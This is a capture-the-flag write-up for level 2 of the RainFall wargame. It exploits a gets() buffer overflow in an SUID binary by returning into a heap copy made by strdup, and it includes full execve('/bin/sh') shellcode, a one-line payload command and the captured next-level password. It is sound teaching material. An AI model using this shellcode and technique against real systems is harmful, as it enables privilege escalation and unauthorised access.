## Level 2

As per usual we are greeted with an SUID binary for `level2`:

```bash
level2@localhost's password: ***
   GCC stack protector support:            Enabled
   Strict user copy checks:                Disabled
   Restrict /dev/mem access:               Enabled
   Restrict /dev/kmem access:              Enabled
   grsecurity / PaX: No GRKERNSEC
   Kernel Heap Hardening: No KERNHEAP
   System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
   RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
   No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```

```bash
level2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
```

Executing the `level2` binary we are prompted for an input, which it then shows back to us:

```bash
level2@RainFall:~$ ./level2 
test
test
```

Lets get to work to see what is happening behind the scenes and disassemble it!

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
```
Inspecting the main of the executable we don't see much, apart from a call to the function `p`.
It's disassembly shows a bit more:

```
(gdb) disas 0x80484d4
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

Quite a lot is happening, first things first is figuring out what our stack looks like.
Looking at the lines:

```asm
push   %ebp
mov    %esp,%ebp
sub    $0x68,%esp
```

There is a subtraction of `0x68` which is `104` bytes in decimal.
To decipher how those bytes are used we can look at all the uses of the `ebp` register.
Usually one would use the `esp` register since this contains the top of the stack, but this function uses the base pointer to index into the local variables instead.
The line containing `0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax` shows `ebp` being used with an offset of `-0x4c` or `-76`.
Further down we can see the lines:

```asm
mov    0x4(%ebp),%eax
mov    %eax,-0xc(%ebp)
mov    -0xc(%ebp),%eax
and    $0xb0000000,%eax
cmp    $0xb0000000,%eax
```

Here `ebp` get indexed at `0x4` which stays `4` in decimal.
If we were to go up 4 bytes from the base pointer we would land on the `return address` of this function!
The value of `-0xc` which is `-12` in decimal is also seemingly used as a comparison value.
We now have enough information to make sense of the variables on the stack.

The stack visualization would look something like this:

```
Higher Memory Addresses
+-----------------------+  <--- Offset = 84
|  Saved EIP            |  <--- The value we need to change
|  (Return Address)     |
+-----------------------+  <--- Offset = 80
|  Saved EBP            |
|  (Old Frame Pointer)  |
+-----------------------+  <--- Offset = 76
|                       |
|  Alignment Padding    |  <--- Alignment caused by the "sub    $0x68,%esp"
|  (Unused Space)       |       In our case it will be 4 bytes
|                       |
+-----------------------+  <--- Offset = 72
|                       |
|   stored return       |
|   address             |
|                       |
+-----------------------+  <--- Offset 64 (%ebp - 0xc) 
|                       |
|   64 bytes buffer     |
|                       |
+-----------------------+  <--- Offset 0 (%ebp - 0x4c)
|                       |
|  Stack Arguments      |
|  (Additional 0x1c)    |  <--- The 28 bytes below buffer start
|                       |
+-----------------------+  <--- ESP
Lower Memory Addresses
```

That's a good start, to overwrite the `return address` there is a total offset of 84 bytes from the start of the buffer.
Lets continue with the rest of the binary. We can see that the buffer gets used as input for a call to `gets`.

```asm
lea    -0x4c(%ebp),%eax     // Loads the pointer to the buffer.
mov    %eax,(%esp)          // Pushes it onto the stack for use as a parameter.
call   0x80483c0 <gets@plt> // Call to gets() with buffer as argument. 
```

Something funky is happening after the `gets` call, the `return address` is retrieved from the stack.
After retrieving it it is AND'ed with the value of `0xb0000000`.

```asm
mov    0x4(%ebp),%eax   // Get value of the return address.
mov    %eax,-0xc(%ebp)  // Save the value into a variable on the stack.
mov    -0xc(%ebp),%eax  // Retrieve it from the variable and move it into `%eax` for comparison.
and    $0xb0000000,%eax
cmp    $0xb0000000,%eax
jne    0x8048527 <p+83>
```

If the top most nibble of the return address contains the value `0xb` it will proceed to call
`printf` with the formatting string set to `"%p\n"` and the `return address` after which `exit(1)` is called.

One thing to note is that you log into the `level2` user you are greeted with a nice message.
There is a specific line that is of interest to us now:

```
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
```

This OS has its ASLR (Address Space Layout Randomization) turned off.
What this means is that the order of every allocation will always return the same address.

We can inspect what address ranges an executable gets by calling `cat /proc/self/maps`.
This will show us what the virtual memory layout of the current process (cat in this case) looks like.

```
08048000-08053000 r-xp 00000000 07:00 12547      /bin/cat
08053000-08054000 r--p 0000a000 07:00 12547      /bin/cat
08054000-08055000 rw-p 0000b000 07:00 12547      /bin/cat
08055000-08076000 rw-p 00000000 00:00 0          [heap]
b7c2b000-b7e2b000 r--p 00000000 07:00 63348      /usr/lib/locale/locale-archive
b7e2b000-b7e2c000 rw-p 00000000 00:00 0 
b7e2c000-b7fcf000 r-xp 00000000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fcf000-b7fd1000 r--p 001a3000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd1000-b7fd2000 rw-p 001a5000 07:00 17904      /lib/i386-linux-gnu/libc-2.15.so
b7fd2000-b7fd5000 rw-p 00000000 00:00 0 
b7fdb000-b7fdd000 rw-p 00000000 00:00 0 
b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
b7fde000-b7ffe000 r-xp 00000000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7ffe000-b7fff000 r--p 0001f000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
b7fff000-b8000000 rw-p 00020000 07:00 17933      /lib/i386-linux-gnu/ld-2.15.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
```

Looking at this output it is clear what the `0xb0000000` AND is trying to prevent.
Any address that has the upper nibble set to `0xb` will be pointing to the stack or a shared lib.
This means we can't simply inject the shellcode we want to execute into the input buffer and then set the return address to the start of the buffer, since it will be stored onto the stack.

Instead we need to somehow get the code we want onto the heap, since its range starts at `0x08055000`.
Lets look further into the binary to see if there is a way to do so.

If we follow the path where the check has been bypassed we get to the end of the function:

```asm
   lea    -0x4c(%ebp),%eax
   mov    %eax,(%esp)
   call   0x80483f0 <puts@plt>
   lea    -0x4c(%ebp),%eax
   mov    %eax,(%esp)
   call   0x80483e0 <strdup@plt>
   leave  
   ret
```

Here the buffer (still at address `-0x4c(%ebp)`) is first handed to `puts` to be displayed again, before being loaded again and handed to `strdup`.
Since `strdup` copies the values inside our buffer and allocates it onto the heap we have found our way to bypass the `0xb0000000` check!

Since ASLR is turned off we can easily figure out what the address returned by `strdup` will be.
Lets open up `gdb` again and set a breakpoint to the `leave` instruction.

```
(gdb) b *0x0804853d
Breakpoint 1 at 0x804853d
```

And then run the executable, giving it some input.

```asm
(gdb) run
Starting program: /home/user/level2/level2 
test
test

Breakpoint 1, 0x0804853d in p ()
```

Lets inspect the return value of `strdup` now:

```asm
(gdb) i r eax
eax            0x804a008	134520840
```

Great! We've found the pointer we need to set inside of our `return address`: `0x804a008`.
Putting all of this knowledge together we can start creating our payload.
[This](https://www.usna.edu/Users/cs/choi/it432/lec/l12/lec.html) is a great resource that explains how to create your own shellcode. This is a very small piece of code that calls `execve` with a `"/bin/sh"` string as argument, creating a shell.

Since we are on a 32 bit system we need to make some changes to the bytecode shown in the tutorial above.
The [shellcode.c](./shellcode.c) file shows these, if we compile it we can see the objdump:

```
 80483b7:	31 c0                	xor    %eax,%eax
 80483b9:	b9 3e 62 79 11       	mov    $0x1179623e,%ecx
 80483be:	81 f1 11 11 11 11    	xor    $0x11111111,%ecx
 80483c4:	51                   	push   %ecx
 80483c5:	bb 3e 73 78 7f       	mov    $0x7f78733e,%ebx
 80483ca:	81 f3 11 11 11 11    	xor    $0x11111111,%ebx
 80483d0:	53                   	push   %ebx
 80483d1:	89 e3                	mov    %esp,%ebx
 80483d3:	50                   	push   %eax
 80483d4:	53                   	push   %ebx
 80483d5:	89 e1                	mov    %esp,%ecx
 80483d7:	31 d2                	xor    %edx,%edx
 80483d9:	b0 0b                	mov    $0xb,%al
 80483db:	cd 80                	int    $0x80
```

Putting all of the bytecode in a single `python` print results into:

```python
print(b'\x31\xc0\xb9\x3e\x62\x79\x11\x81\xf1\x11\x11\x11\x11\x51\xbb\x3e\x73\x78\x7f\x81\xf3\x11\x11\x11\x11\x53\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80')
```

All we need to do now is add some extra padding to be able to set the `return address` (in reverse order) to our own shellcode!

```bash
python -c "print(b'\x31\xc0\xb9\x3e\x62\x79\x11\x81\xf1\x11\x11\x11\x11\x51\xbb\x3e\x73\x78\x7f\x81\xf3\x11\x11\x11\x11\x53\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' + '\x00' * 42 + '\x08\xa0\x04\x08')"  > payload && cat payload - | ./level2
```

After printing some garbage values (the shellcode converted to ascii) we'll have gained shell access!
Time to claim the flag by reading `level3`'s `.pass` file:

```bash
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
